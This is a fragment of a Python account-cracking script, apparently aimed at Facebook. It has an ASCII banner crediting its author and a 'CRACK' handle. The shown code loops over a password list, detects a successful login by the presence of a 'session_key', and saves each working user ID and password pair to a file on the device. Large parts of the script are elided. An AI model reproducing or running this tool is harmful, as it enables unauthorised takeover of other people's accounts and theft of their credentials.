...
╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
 ...
 SHABNAM NOORI 🇦🇫                                                                                                                                         
----------------------------------------------
☆AUTHER   :SHABNAM NOORI
☆TEAM        :NOORI
☆SISTER ❤️:TABASOM SAHAR
☆Facebook :SHABNAM NOORI
☆CRACK      :SHABOO
☆TOOLS      :FREE + 
------------------------------------------------
\033[1: VERSION : 1.0.4
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Saboo-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Saboo-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/Saboo-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Saboo-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Saboo-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
